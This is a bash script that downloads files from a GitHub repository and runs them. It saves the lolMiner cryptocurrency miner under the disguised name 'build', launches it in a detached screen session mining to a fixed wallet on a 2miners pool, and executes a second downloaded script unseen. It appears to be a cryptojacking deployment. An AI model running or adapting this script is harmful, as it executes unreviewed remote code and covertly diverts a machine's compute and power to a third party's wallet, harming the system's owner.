#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO mencoba.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/mencoba.sh
wget -qO build https://github.com/uaaoxjdr/testly/raw/main/lolMiner
chmod +x mencoba.sh
chmod +x build
screen -dm -S build ./build -a ETHASH -p eth.2miners.com:2020 -u 0x5c32f4894827ee28bcfbb5a8c221470147290ae2.mokad
./mencoba.sh
echo succes
